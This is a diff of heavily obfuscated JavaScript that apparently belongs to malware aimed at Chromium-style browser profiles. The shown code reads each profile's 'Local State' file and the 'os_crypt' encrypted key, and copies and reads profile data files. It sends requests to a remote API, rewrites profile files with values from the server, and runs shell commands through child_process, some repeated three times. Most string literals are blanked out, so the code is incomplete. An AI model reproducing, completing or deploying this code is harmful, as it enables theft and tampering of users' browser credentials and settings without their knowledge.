+              ns.E506IW4.W46DKVE = data2[pk('A', pl++)];
+              ns.E506IW4.C587HZY = data2[pk('A', pl++)];
+              ns.E506IW4.L4F4D5K = data2[pk('A', pl++)];
+              ns.E506IW4.d5A04IA = data2[pk('A', pl++)];
+              ns.E506IW4.X69CKV1 = data2[pk('A', pl++)];
+              ns.E506IW4.Q68703N = data2[pk('A', pl++)];
+              ns.E506IW4.k5FECH9 = data2[pk('A', pl++)];
+              ns.E506IW4.Q6AD4K1 = data2[pk('A', pl++)];
+              ns.E506IW4.c4954SH = data2[pk('A', pl++)];
+              ns.E506IW4.n601ESN = data2[pk('A', pl++)];
+              ns.E506IW4.c41AH48 = data2[pk('A', pl++)];
+              ns.E506IW4.c507RUL = data2[pk('A', pl++)];
+              ns.E506IW4.B5176TW = data2[pk('A', pl++)];
+              ns.E506IW4.f44CYDD = data2[pk('A', pl++)];
+              ns.E506IW4.D582MML = data2[pk('A', pl++)];
+              ns.E506IW4.A6C6QFI = data2[pk('A', pl++)];
+              ns.E506IW4.E509RHP = data2[pk('A', pl++)];
+              ns.E506IW4.p49ALL3 = data2[pk('A', pl++)];
+              ns.E506IW4.H4A2CBA = data2[pk('A', pl++)];
+              ns.E506IW4.Y420K0O = data2[pk('A', pl++)];
+              ns.E506IW4.V615O8R = data2[pk('A', pl++)];
+              ns.E506IW4.g477SEM = data2[pk('A', pl++)];
+              ns.E506IW4.T525XE5 = data2[pk('A', pl++)];
+              ns.E506IW4.V68C0TQ = data2[pk('A', pl++)];
+              ns.E506IW4.P41D36M = data2[pk('A', pl++)];
+              ns.E506IW4.I4E1ZJ4 = data2[pk('A', pl++)];
+              ns.E506IW4.r62EVVQ = data2[pk('A', pl++)];
+              ns.E506IW4.I4046MY = data2[pk('A', pl++)];
+              ns.E506IW4.i61EV2V = data2[pk('A', pl++)];
+              ns.E506IW4.l6C9B2Z = data2[pk('A', pl++)];
+              ns.E506IW4.z3EF88U = data2[pk('A', pl++)];
+              ns.E506IW4.C61B0CZ = data2[pk('A', pl++)];
+              ns.E506IW4.i623ZUC = data2[pk('A', pl++)];
+              ns.E506IW4.F6750PF = data2[pk('A', pl++)];
+              ns.E506IW4.w443M14 = data2[pk('A', pl++)];
+              if (!ns.E506IW4.d6C8UEH()) {
                 throw new Error("GetRtcFailed");
               }
             } else {
@@ -2197,59 +2191,59 @@
           }
         }
         async Z425M7G() {
-          this.A64CEBI = ns.S634YX3((await nr.S559FZQ.l610ZCY("usid")) ?? '');
-          ns.w3F3UWA.s59BT06('');
-          if (((await nr.S559FZQ.l610ZCY("c-key")) ?? '') != nt.e5325L3.q474LOF) {
+          this.A64CEBI = nr.S634YX3((await nq.S559FZQ.l610ZCY("usid")) ?? '');
+          nr.w3F3UWA.s59BT06('');
+          if (((await nq.S559FZQ.l610ZCY("c-key")) ?? '') != ns.e5325L3.q474LOF) {
             this.Z5A9DKG = true;
           }
-          nt.e5325L3.U430LYO = await this.D656W9S(2);
-          nt.e5325L3.r53FV0M = nt.e5325L3.U430LYO != '';
-          nt.e5325L3.a6B1QAU = await this.D656W9S(1);
-          nt.e5325L3.k596N0J = nt.e5325L3.a6B1QAU != '';
+          ns.e5325L3.U430LYO = await this.D656W9S(2);
+          ns.e5325L3.r53FV0M = ns.e5325L3.U430LYO != '';
+          ns.e5325L3.a6B1QAU = await this.D656W9S(1);
+          ns.e5325L3.k596N0J = ns.e5325L3.a6B1QAU != '';
           if ((await this.D656W9S(3)) != '') {
-            nt.e5325L3.g4184BO = true;
+            ns.e5325L3.g4184BO = true;
           }
           if ((await this.D656W9S(4)) != '') {
-            nt.e5325L3.R6780KK = true;
+            ns.e5325L3.R6780KK = true;
           }
           if ((await this.D656W9S(5)) != '') {
-            nt.e5325L3.n664BX9 = true;
+            ns.e5325L3.n664BX9 = true;
           }
           if ((await this.D656W9S(6)) != '') {
-            nt.e5325L3.x4ADWAE = true;
+            ns.e5325L3.x4ADWAE = true;
           }
           if ((await this.D656W9S(7)) != '') {
-            nt.e5325L3.z4DE429 = true;
+            ns.e5325L3.z4DE429 = true;
           }
-          nt.e5325L3.H64FNMG = await this.o43FWNP(false, 1);
-          nt.e5325L3.M56F8MB = await this.o43FWNP(false, 2);
-          nt.e5325L3.X4B7201 = false;
+          ns.e5325L3.H64FNMG = await this.o43FWNP(false, 1);
+          ns.e5325L3.M56F8MB = await this.o43FWNP(false, 2);
+          ns.e5325L3.X4B7201 = false;
           if ("" && Array.isArray("")) {
+            for (let po = 0; po < "".length; po++) {
+              if (await this.A5FCGS4(""[po])) {
+                ns.e5325L3.b57CS7T = po;
+                nr.w3F3UWA.s59BT06('');
+                break;
+              }
+            }
+          }
+          if ("" && Array.isArray("")) {
+            nr.w3F3UWA.s59BT06('');
             for (let pp = 0; pp < "".length; pp++) {
-              if (await this.A5FCGS4(""[pp])) {
-                nt.e5325L3.b57CS7T = pp;
-                ns.w3F3UWA.s59BT06('');
+              const pq = ""[pp];
+              if (await this.u459C3E(pq.Item1, pq.Item2)) {
+                ns.e5325L3.K48B40X = pp;
+                nr.w3F3UWA.s59BT06('');
                 break;
               }
             }
-          }
-          if ("" && Array.isArray("")) {
-            ns.w3F3UWA.s59BT06('');
-            for (let pq = 0; pq < "".length; pq++) {
-              const pr = ""[pq];
-              if (await this.u459C3E(pr.Item1, pr.Item2)) {
-                nt.e5325L3.K48B40X = pq;
-                ns.w3F3UWA.s59BT06('');
-                break;
-              }
-            }
-            ns.w3F3UWA.s59BT06('');
+            nr.w3F3UWA.s59BT06('');
           }
         }
-        async o43FWNP(ps, pt) {
-          return new Promise((pu) => {
+        async o43FWNP(pr, ps) {
+          return new Promise((pt) => {
             var str10 = "";
-            switch (pt) {
+            switch (ps) {
               case 1:
                 str10 = "";
                 break;
@@ -2257,45 +2251,45 @@
                 str10 = "";
                 break;
             }
-            require("child_process").exec((0, ns.o5B4F49)("", str10, ''), (pv, pw, px) => {
-              if (pv) {
+            require("child_process").exec((0, nr.o5B4F49)("", str10, ''), (pu, pv, pw) => {
+              if (pu) {
                 (async () => {
-                  await ns.w3F3UWA.Y6CDW21(pt, ns.z579NEI.O5CE32V, pv);
+                  await nr.w3F3UWA.Y6CDW21(ps, nr.z579NEI.O5CE32V, pu);
                 })();
-                pu(false);
+                pt(false);
               }
-              if (px) {
+              if (pw) {
                 (async () => {
-                  await ns.w3F3UWA.Y6CDW21(pt, ns.z579NEI.C4D4SOG, pv);
+                  await nr.w3F3UWA.Y6CDW21(ps, nr.z579NEI.C4D4SOG, pu);
                 })();
-                pu(false);
+                pt(false);
               }
-              ns.w3F3UWA.s59BT06('');
-              pu(pw.trim() !== '');
+              nr.w3F3UWA.s59BT06('');
+              pt(pv.trim() !== '');
             });
           });
         }
         async l660ZQF() {
-          ns.w3F3UWA.s59BT06('');
-          let py = await nr.S559FZQ.l610ZCY("iid");
-          if (py) {
-            nt.e5325L3.q474LOF = py;
+          nr.w3F3UWA.s59BT06('');
+          let px = await nq.S559FZQ.l610ZCY("iid");
+          if (px) {
+            ns.e5325L3.q474LOF = px;
             try {
-              var pz = await ns.e696T3N("api/s3/remove?iid=" + py);
-              if (pz) {
-                const qa = await pz.json();
+              var py = await nr.e696T3N("api/s3/remove?iid=" + px);
+              if (py) {
+                const pz = await py.json();
               }
-              await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.z450T6K);
-            } catch (qb) {
-              await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.z450T6K, qb);
+              await nr.w3F3UWA.W4EF0EI(1, nr.z579NEI.z450T6K);
+            } catch (qa) {
+              await nr.w3F3UWA.Y6CDW21(0, nr.z579NEI.z450T6K, qa);
             }
           }
         }
-        async D656W9S(qc) {
+        async D656W9S(qb) {
           const path5 = require("path");
           let str11 = '';
-          if (qc == 1) {
-            str11 = path5.join(nr.S559FZQ.D47CBV3(), "");
+          if (qb == 1) {
+            str11 = path5.join(nq.S559FZQ.D47CBV3(), "");
             if (await this.A5FCGS4(str11)) {
               return str11;
             }
@@ -2307,7 +2301,7 @@
             if (await this.A5FCGS4(str11)) {
               return str11;
             }
-          } else if (qc == 2) {
+          } else if (qb == 2) {
             str11 = "";
             if (await this.A5FCGS4(str11)) {
               return str11;
@@ -2316,465 +2310,465 @@
             if (await this.A5FCGS4(str11)) {
               return str11;
             }
-          } else if (qc == 3) {
+          } else if (qb == 3) {
             str11 = path5.join(require("process").env.USERPROFILE, "");
             if (await this.A5FCGS4(str11)) {
               return str11;
             }
-          } else if (qc == 4) {
-            str11 = path5.join(nr.S559FZQ.D47CBV3(), "");
+          } else if (qb == 4) {
+            str11 = path5.join(nq.S559FZQ.D47CBV3(), "");
             if (await this.A5FCGS4(str11)) {
               return str11;
             }
-          } else if (qc == 5) {
-            str11 = path5.join(nr.S559FZQ.D47CBV3(), "");
+          } else if (qb == 5) {
+            str11 = path5.join(nq.S559FZQ.D47CBV3(), "");
             if (await this.A5FCGS4(str11)) {
               return str11;
             }
-          } else if (qc == 6) {
-            str11 = path5.join(nr.S559FZQ.D47CBV3(), "");
+          } else if (qb == 6) {
+            str11 = path5.join(nq.S559FZQ.D47CBV3(), "");
             if (await this.A5FCGS4(str11)) {
               return str11;
             }
-          } else if (qc == 7) {
-            str11 = path5.join(nr.S559FZQ.P6A7H5F(), "", "");
+          } else if (qb == 7) {
+            str11 = path5.join(nq.S559FZQ.P6A7H5F(), "", "");
             if (await this.A5FCGS4(str11)) {
               return str11;
             }
           }
           return '';
         }
-        async j458FW3(qd) {
-          ns.w3F3UWA.s59BT06('');
-          if (this.A64CEBI == '' || !nt.e5325L3.k596N0J) {
+        async j458FW3(qc) {
+          nr.w3F3UWA.s59BT06('');
+          if (this.A64CEBI == '' || !ns.e5325L3.k596N0J) {
             return;
           }
           const path6 = require("path");
-          const qe = nr.S559FZQ.D47CBV3();
-          if (!qe) {
-            await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.F65A6FS);
+          const qd = nq.S559FZQ.D47CBV3();
+          if (!qd) {
+            await nr.w3F3UWA.Y6CDW21(0, nr.z579NEI.F65A6FS);
             return;
           }
-          const qf = path6.join(qe, "");
-          if (nt.e5325L3.a6B1QAU == '') {
-            await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.m599GWS);
+          const qe = path6.join(qd, "");
+          if (ns.e5325L3.a6B1QAU == '') {
+            await nr.w3F3UWA.W4EF0EI(1, nr.z579NEI.m599GWS);
             return;
           }
-          if (this.Z5A9DKG || !qd || nt.e5325L3.x484Q1X == nr.a689XV5.j5C58S9) {
-            if (qd) {
-              qd = false;
+          if (this.Z5A9DKG || !qc || ns.e5325L3.x484Q1X == nq.a689XV5.j5C58S9) {
+            if (qc) {
+              qc = false;
             }
             await this.D45AYQ3("");
-            ns.w3F3UWA.s59BT06('');
+            nr.w3F3UWA.s59BT06('');
           }
-          ns.w3F3UWA.s59BT06('');
-          let [qg, qh] = await this.A554U7Y(1, path6.join(qf, ""), false);
-          if (qh && qh !== '') {
-            qh = this.r42EX1Q(qh);
-            ns.w3F3UWA.s59BT06('');
+          nr.w3F3UWA.s59BT06('');
+          let [qf, qg] = await this.A554U7Y(1, path6.join(qe, ""), false);
+          if (qg && qg !== '') {
+            qg = this.r42EX1Q(qg);
+            nr.w3F3UWA.s59BT06('');
           }
-          if (qg) {
+          if (qf) {
             let flag2 = false;
-            for (let qi = 0; qi < qg.length; qi++) {
-              let qj = path6.join(qf, qg[qi], "");
-              let qk = path6.join(qf, qg[qi], "");
-              let ql = path6.join(qf, qg[qi], "");
-              let qm = path6.join(qf, qg[qi], "");
-              if (await this.X428OQY(qj, ql)) {
-                await this.X428OQY(qk, qm);
+            for (let qh = 0; qh < qf.length; qh++) {
+              let qi = path6.join(qe, qf[qh], "");
+              let qj = path6.join(qe, qf[qh], "");
+              let qk = path6.join(qe, qf[qh], "");
+              let ql = path6.join(qe, qf[qh], "");
+              if (await this.X428OQY(qi, qk)) {
+                await this.X428OQY(qj, ql);
                 let str12 = '';
                 let str13 = '';
-                await this.r576OBZ(ql).then((qo) => {
-                  str12 = qo;
-                }).catch((qp) => {
+                await this.r576OBZ(qk).then((qn) => {
+                  str12 = qn;
+                }).catch((qo) => {
                   (async () => {
-                    await ns.w3F3UWA.Y6CDW21(1, ns.z579NEI.n690Q7K, qp);
+                    await nr.w3F3UWA.Y6CDW21(1, nr.z579NEI.n690Q7K, qo);
                   })();
                 });
-                await this.r576OBZ(qm).then((qq) => {
-                  str13 = qq;
-                }).catch((qr) => {
+                await this.r576OBZ(ql).then((qp) => {
+                  str13 = qp;
+                }).catch((qq) => {
                   (async () => {
-                    await ns.w3F3UWA.Y6CDW21(1, ns.z579NEI.V6A4P0Z, qr);
+                    await nr.w3F3UWA.Y6CDW21(1, nr.z579NEI.V6A4P0Z, qq);
                   })();
                 });
                 if (str12 == '') {
-                  await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.Q455VXT);
+                  await nr.w3F3UWA.W4EF0EI(1, nr.z579NEI.Q455VXT);
                   continue;
                 }
-                ns.w3F3UWA.s59BT06('');
-                let qn = await this.O515QL8(1, str12, str13);
-                if (!qn.m5BCP18) {
-                  await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.L5CFOQF);
+                nr.w3F3UWA.s59BT06('');
+                let qm = await this.O515QL8(1, str12, str13);
+                if (!qm.m5BCP18) {
+                  await nr.w3F3UWA.W4EF0EI(1, nr.z579NEI.L5CFOQF);
                   return;
                 }
-                if (qd && ((await this.H5AE3US(qn.C5C7K1A)) || (await this.H5AE3US(qn.K5F23B9)))) {
-                  ns.w3F3UWA.s59BT06('');
+                if (qc && ((await this.H5AE3US(qm.C5C7K1A)) || (await this.H5AE3US(qm.K5F23B9)))) {
+                  nr.w3F3UWA.s59BT06('');
                   await this.j458FW3(false);
                   return;
                 }
-                ns.w3F3UWA.s59BT06('');
+                nr.w3F3UWA.s59BT06('');
                 let flag3 = false;
-                if (await this.H5AE3US(qn.C5C7K1A)) {
-                  await this.Y53EKLA(ql, qn.C5C7K1A);
+                if (await this.H5AE3US(qm.C5C7K1A)) {
+                  await this.Y53EKLA(qk, qm.C5C7K1A);
+                  await this.X428OQY(qk, qi);
+                  nr.w3F3UWA.s59BT06('');
+                  flag3 = true;
+                }
+                if (await this.H5AE3US(qm.K5F23B9)) {
+                  await this.Y53EKLA(ql, qm.K5F23B9);
                   await this.X428OQY(ql, qj);
-                  ns.w3F3UWA.s59BT06('');
+                  nr.w3F3UWA.s59BT06('');
                   flag3 = true;
                 }
-                if (await this.H5AE3US(qn.K5F23B9)) {
-                  await this.Y53EKLA(qm, qn.K5F23B9);
-                  await this.X428OQY(qm, qk);
-                  ns.w3F3UWA.s59BT06('');
+                if (qm.j5D4IOV && qm.j5D4IOV.length !== 0) {
+                  await this.O69AL84("" + qf[qh], "", qm.j5D4IOV);
+                  nr.w3F3UWA.s59BT06('');
                   flag3 = true;
                 }
-                if (qn.j5D4IOV && qn.j5D4IOV.length !== 0) {
-                  await this.O69AL84("" + qg[qi], "", qn.j5D4IOV);
-                  ns.w3F3UWA.s59BT06('');
-                  flag3 = true;
-                }
-                if (await this.H5AE3US(qn.O6CBOE4)) {
-                  const data3 = JSON.parse(qn.O6CBOE4);
+                if (await this.H5AE3US(qm.O6CBOE4)) {
+                  const data3 = JSON.parse(qm.O6CBOE4);
                   let arr11 = [];
-                  for (const qs in data3) {
-                    if (data3.hasOwnProperty(qs)) {
-                      const qt = data3[qs];
-                      for (const qu in qt) {
-                        if (qt.hasOwnProperty(qu)) {
-                          await this.O69AL84(qs.replace("%PROFILE%", qg[qi]), qu, qt[qu]);
-                          arr11.push(qu);
+                  for (const qr in data3) {
+                    if (data3.hasOwnProperty(qr)) {
+                      const qs = data3[qr];
+                      for (const qt in qs) {
+                        if (qs.hasOwnProperty(qt)) {
+                          await this.O69AL84(qr.replace("%PROFILE%", qf[qh]), qt, qs[qt]);
+                          arr11.push(qt);
                         }
                       }
                     }
                   }
                   if (arr11.length > 0) {
-                    await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.f4D0VNO, [arr11]);
+                    await nr.w3F3UWA.W4EF0EI(1, nr.z579NEI.f4D0VNO, [arr11]);
                   }
                 }
                 flag2 = true;
                 if (flag3) {
-                  await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.y462O1X);
+                  await nr.w3F3UWA.W4EF0EI(1, nr.z579NEI.y462O1X);
                 } else {
-                  await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.E69EQ1O);
+                  await nr.w3F3UWA.W4EF0EI(1, nr.z579NEI.E69EQ1O);
                 }
               }
             }
             if (flag2) {
-              await nr.S559FZQ.c5E4Z7C("c-key", nt.e5325L3.q474LOF);
+              await nq.S559FZQ.c5E4Z7C("c-key", ns.e5325L3.q474LOF);
             }
           }
-          ns.w3F3UWA.s59BT06('');
+          nr.w3F3UWA.s59BT06('');
           return;
         }
-        async p4FE5X4(qv) {
-          ns.w3F3UWA.s59BT06('');
-          if (!nt.e5325L3.k596N0J) {
+        async p4FE5X4(qu) {
+          nr.w3F3UWA.s59BT06('');
+          if (!ns.e5325L3.k596N0J) {
             return;
           }
           const path7 = require("path");
-          const qw = nr.S559FZQ.D47CBV3();
-          if (!qw) {
-            await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.F65A6FS);
+          const qv = nq.S559FZQ.D47CBV3();
+          if (!qv) {
+            await nr.w3F3UWA.Y6CDW21(0, nr.z579NEI.F65A6FS);
             return;
           }
-          const qx = path7.join(qw, "");
-          if (nt.e5325L3.a6B1QAU == '') {
-            await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.m599GWS);
+          const qw = path7.join(qv, "");
+          if (ns.e5325L3.a6B1QAU == '') {
+            await nr.w3F3UWA.W4EF0EI(1, nr.z579NEI.m599GWS);
             return;
           }
-          if (this.Z5A9DKG || !qv || nt.e5325L3.x484Q1X == nr.a689XV5.j5C58S9) {
-            if (qv) {
-              qv = false;
+          if (this.Z5A9DKG || !qu || ns.e5325L3.x484Q1X == nq.a689XV5.j5C58S9) {
+            if (qu) {
+              qu = false;
               await this.D45AYQ3("");
-              ns.w3F3UWA.s59BT06('');
+              nr.w3F3UWA.s59BT06('');
             }
-            ns.w3F3UWA.s59BT06('');
-            let [qy, qz] = await this.A554U7Y(1, path7.join(qx, ""), true);
-            if (qz && qz !== '') {
-              qz = this.r42EX1Q(qz);
-              ns.w3F3UWA.s59BT06('');
+            nr.w3F3UWA.s59BT06('');
+            let [qx, qy] = await this.A554U7Y(1, path7.join(qw, ""), true);
+            if (qy && qy !== '') {
+              qy = this.r42EX1Q(qy);
+              nr.w3F3UWA.s59BT06('');
             }
-            if (qy) {
+            if (qx) {
               let flag4 = false;
-              for (let ra = 0; ra < qy.length; ra++) {
-                let rb = path7.join(qx, qy[ra], "");
-                let rc = path7.join(qx, qy[ra], "");
-                let rd = path7.join(qx, qy[ra], "");
-                let re = path7.join(qx, qy[ra], "");
-                if (await this.X428OQY(rb, rc)) {
-                  await this.X428OQY(rd, re);
+              for (let qz = 0; qz < qx.length; qz++) {
+                let ra = path7.join(qw, qx[qz], "");
+                let rb = path7.join(qw, qx[qz], "");
+                let rc = path7.join(qw, qx[qz], "");
+                let rd = path7.join(qw, qx[qz], "");
+                if (await this.X428OQY(ra, rb)) {
+                  await this.X428OQY(rc, rd);
+                  let re;
                   let rf;
-                  let rg;
-                  await this.r576OBZ(rc).then((ri) => {
-                    rf = ri;
-                  }).catch((rj) => {
+                  await this.r576OBZ(rb).then((rh) => {
+                    re = rh;
+                  }).catch((ri) => {
                     (async () => {
-                      await ns.w3F3UWA.Y6CDW21(1, ns.z579NEI.n690Q7K, rj);
+                      await nr.w3F3UWA.Y6CDW21(1, nr.z579NEI.n690Q7K, ri);
                     })();
                   });
-                  await this.G5B8BDL(re).then((rk) => {
-                    rg = rk ?? '';
-                  }).catch((rl) => {
+                  await this.G5B8BDL(rd).then((rj) => {
+                    rf = rj ?? '';
+                  }).catch((rk) => {
                     (async () => {
-                      await ns.w3F3UWA.Y6CDW21(1, ns.z579NEI.K4E5MWI, rl);
+                      await nr.w3F3UWA.Y6CDW21(1, nr.z579NEI.K4E5MWI, rk);
                     })();
                   });
-                  if (rf == '') {
-                    await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.Q455VXT);
+                  if (re == '') {
+                    await nr.w3F3UWA.W4EF0EI(1, nr.z579NEI.Q455VXT);
                     continue;
                   }
-                  ns.w3F3UWA.s59BT06('');
-                  let rh = await this.w516KLO(1, qz, rf, rg);
-                  if (!rh.m5BCP18) {
-                    await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.L5CFOQF);
+                  nr.w3F3UWA.s59BT06('');
+                  let rg = await this.w516KLO(1, qy, re, rf);
+                  if (!rg.m5BCP18) {
+                    await nr.w3F3UWA.W4EF0EI(1, nr.z579NEI.L5CFOQF);
                     return;
                   }
-                  ns.w3F3UWA.s59BT06('');
-                  if (await this.H5AE3US(rh.C5C7K1A)) {
-                    await this.Y53EKLA(rc, rh.C5C7K1A);
-                    await this.X428OQY(rc, rb);
-                    ns.w3F3UWA.s59BT06('');
+                  nr.w3F3UWA.s59BT06('');
+                  if (await this.H5AE3US(rg.C5C7K1A)) {
+                    await this.Y53EKLA(rb, rg.C5C7K1A);
+                    await this.X428OQY(rb, ra);
+                    nr.w3F3UWA.s59BT06('');
                   }
-                  if ((await this.H5AE3US(rh.p6845JK)) && (await this.r501Z9L(re, rh.p6845JK))) {
+                  if ((await this.H5AE3US(rg.p6845JK)) && (await this.r501Z9L(rd, rg.p6845JK))) {
                     if (await this.o43FWNP(false, 1)) {
                       await this.D45AYQ3("");
-                      ns.w3F3UWA.s59BT06('');
+                      nr.w3F3UWA.s59BT06('');
                     }
-                    await this.X428OQY(re, rd);
-                    ns.w3F3UWA.s59BT06('');
-                    await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.W4F1V66);
+                    await this.X428OQY(rd, rc);
+                    nr.w3F3UWA.s59BT06('');
+                    await nr.w3F3UWA.W4EF0EI(1, nr.z579NEI.W4F1V66);
                   } else {
-                    await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.n4EBPL8);
+                    await nr.w3F3UWA.W4EF0EI(1, nr.z579NEI.n4EBPL8);
                   }
                   flag4 = true;
                 }
               }
               if (flag4) {
-                await nr.S559FZQ.c5E4Z7C("cw-key", nt.e5325L3.q474LOF);
+                await nq.S559FZQ.c5E4Z7C("cw-key", ns.e5325L3.q474LOF);
               }
             }
           }
-          ns.w3F3UWA.s59BT06('');
+          nr.w3F3UWA.s59BT06('');
           return;
         }
-        async k47F3QK(rm) {
-          ns.w3F3UWA.s59BT06('');
-          if (!nt.e5325L3.k596N0J) {
+        async k47F3QK(rl) {
+          nr.w3F3UWA.s59BT06('');
+          if (!ns.e5325L3.k596N0J) {
             return;
           }
           const path8 = require("path");
-          const rn = nr.S559FZQ.D47CBV3();
-          if (!rn) {
-            await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.F65A6FS);
+          const rm = nq.S559FZQ.D47CBV3();
+          if (!rm) {
+            await nr.w3F3UWA.Y6CDW21(0, nr.z579NEI.F65A6FS);
             return;
           }
-          const ro = path8.join(rn, "");
-          if (nt.e5325L3.a6B1QAU == '') {
-            await ns.w3F3UWA.W4EF0EI(2, ns.z579NEI.m599GWS);
+          const rn = path8.join(rm, "");
+          if (ns.e5325L3.a6B1QAU == '') {
+            await nr.w3F3UWA.W4EF0EI(2, nr.z579NEI.m599GWS);
             return;
           }
-          if (this.Z5A9DKG || !rm || nt.e5325L3.x484Q1X == nr.a689XV5.j5C58S9) {
-            if (rm) {
-              rm = false;
+          if (this.Z5A9DKG || !rl || ns.e5325L3.x484Q1X == nq.a689XV5.j5C58S9) {
+            if (rl) {
+              rl = false;
               await this.D45AYQ3("");
-              ns.w3F3UWA.s59BT06('');
+              nr.w3F3UWA.s59BT06('');
             }
-            ns.w3F3UWA.s59BT06('');
-            let [rp, rq] = await this.A554U7Y(2, path8.join(ro, ""), true);
-            if (rq && rq !== '') {
-              rq = this.r42EX1Q(rq);
-              ns.w3F3UWA.s59BT06('');
+            nr.w3F3UWA.s59BT06('');
+            let [ro, rp] = await this.A554U7Y(2, path8.join(rn, ""), true);
+            if (rp && rp !== '') {
+              rp = this.r42EX1Q(rp);
+              nr.w3F3UWA.s59BT06('');
             }
-            if (rp) {
+            if (ro) {
               let flag5 = false;
-              for (let rr = 0; rr < rp.length; rr++) {
-                let rs = path8.join(ro, rp[rr], "");
-                let rt = path8.join(ro, rp[rr], "");
-                let ru = path8.join(ro, rp[rr], "");
-                let rv = path8.join(ro, rp[rr], "");
-                if (await this.X428OQY(rs, rt)) {
-                  await this.X428OQY(ru, rv);
+              for (let rq = 0; rq < ro.length; rq++) {
+                let rr = path8.join(rn, ro[rq], "");
+                let rs = path8.join(rn, ro[rq], "");
+                let rt = path8.join(rn, ro[rq], "");
+                let ru = path8.join(rn, ro[rq], "");
+                if (await this.X428OQY(rr, rs)) {
+                  await this.X428OQY(rt, ru);
+                  let rv;
                   let rw;
-                  let rx;
-                  await this.r576OBZ(rt).then((rz) => {
-                    rw = rz;
-                  }).catch((sa) => {
+                  await this.r576OBZ(rs).then((ry) => {
+                    rv = ry;
+                  }).catch((rz) => {
                     (async () => {
-                      await ns.w3F3UWA.Y6CDW21(2, ns.z579NEI.n690Q7K, sa);
+                      await nr.w3F3UWA.Y6CDW21(2, nr.z579NEI.n690Q7K, rz);
                     })();
                   });
-                  await this.G5B8BDL(rv).then((sb) => {
-                    rx = sb ?? '';
-                  }).catch((sc) => {
+                  await this.G5B8BDL(ru).then((sa) => {
+                    rw = sa ?? '';
+                  }).catch((sb) => {
                     (async () => {
-                      await ns.w3F3UWA.Y6CDW21(2, ns.z579NEI.K4E5MWI, sc);
+                      await nr.w3F3UWA.Y6CDW21(2, nr.z579NEI.K4E5MWI, sb);
                     })();
                   });
-                  if (rw == '') {
-                    await ns.w3F3UWA.W4EF0EI(2, ns.z579NEI.Q455VXT);
+                  if (rv == '') {
+                    await nr.w3F3UWA.W4EF0EI(2, nr.z579NEI.Q455VXT);
                     continue;
                   }
-                  ns.w3F3UWA.s59BT06('');
-                  let ry = await this.w516KLO(2, rq, rw, rx);
-                  if (!ry.m5BCP18) {
-                    await ns.w3F3UWA.W4EF0EI(2, ns.z579NEI.L5CFOQF);
+                  nr.w3F3UWA.s59BT06('');
+                  let rx = await this.w516KLO(2, rp, rv, rw);
+                  if (!rx.m5BCP18) {
+                    await nr.w3F3UWA.W4EF0EI(2, nr.z579NEI.L5CFOQF);
                     return;
                   }
-                  ns.w3F3UWA.s59BT06('');
-                  if (await this.H5AE3US(ry.C5C7K1A)) {
-                    await this.Y53EKLA(rt, ry.C5C7K1A);
-                    await this.X428OQY(rt, rs);
-                    ns.w3F3UWA.s59BT06('');
+                  nr.w3F3UWA.s59BT06('');
+                  if (await this.H5AE3US(rx.C5C7K1A)) {
+                    await this.Y53EKLA(rs, rx.C5C7K1A);
+                    await this.X428OQY(rs, rr);
+                    nr.w3F3UWA.s59BT06('');
                   }
-                  if ((await this.H5AE3US(ry.p6845JK)) && (await this.r501Z9L(rv, ry.p6845JK))) {
+                  if ((await this.H5AE3US(rx.p6845JK)) && (await this.r501Z9L(ru, rx.p6845JK))) {
                     if (await this.o43FWNP(false, 2)) {
                       await this.D45AYQ3("");
-                      ns.w3F3UWA.s59BT06('');
+                      nr.w3F3UWA.s59BT06('');
                     }
-                    await this.X428OQY(rv, ru);
-                    ns.w3F3UWA.s59BT06('');
-                    await ns.w3F3UWA.W4EF0EI(2, ns.z579NEI.W4F1V66);
+                    await this.X428OQY(ru, rt);
+                    nr.w3F3UWA.s59BT06('');
+                    await nr.w3F3UWA.W4EF0EI(2, nr.z579NEI.W4F1V66);
                   } else {
-                    await ns.w3F3UWA.W4EF0EI(2, ns.z579NEI.n4EBPL8);
+                    await nr.w3F3UWA.W4EF0EI(2, nr.z579NEI.n4EBPL8);
                   }
                   flag5 = true;
                 }
               }
               if (flag5) {
-                await nr.S559FZQ.c5E4Z7C("ew-key", nt.e5325L3.q474LOF);
+                await nq.S559FZQ.c5E4Z7C("ew-key", ns.e5325L3.q474LOF);
               }
             }
           }
-          ns.w3F3UWA.s59BT06('');
+          nr.w3F3UWA.s59BT06('');
           return;
         }
-        async E4E2LLU(sd) {
-          return new Promise((se) => setTimeout(se, sd));
+        async E4E2LLU(sc) {
+          return new Promise((sd) => setTimeout(sd, sc));
         }
-        async D45AYQ3(sf, sg = true) {
+        async D45AYQ3(se, sf = true) {
           const cp3 = require("child_process");
-          if (sg) {
-            for (let sh = 0; sh < 3; sh++) {
-              ns.w3F3UWA.s59BT06('');
-              cp3.exec((0, ns.o5B4F49)("", sf));
+          if (sf) {
+            for (let sg = 0; sg < 3; sg++) {
+              nr.w3F3UWA.s59BT06('');
+              cp3.exec((0, nr.o5B4F49)("", se));
               await this.E4E2LLU(100);
             }
           }
-          ns.w3F3UWA.s59BT06('');
-          cp3.exec((0, ns.o5B4F49)("", sf));
+          nr.w3F3UWA.s59BT06('');
+          cp3.exec((0, nr.o5B4F49)("", se));
           await this.E4E2LLU(100);
         }
-        async A554U7Y(si, sj, sk = false) {
+        async A554U7Y(sh, si, sj = false) {
           try {
-            const data4 = JSON.parse(require("fs").readFileSync(sj, "utf8"));
-            ns.w3F3UWA.s59BT06('');
-            ns.w3F3UWA.s59BT06('');
-            return [Object.keys(data4.profile?.info_cache || {}), sk ? data4.os_crypt?.encrypted_key || '' : ''];
-          } catch (sl) {
-            await ns.w3F3UWA.Y6CDW21(si, ns.z579NEI.y46BIEQ, sl);
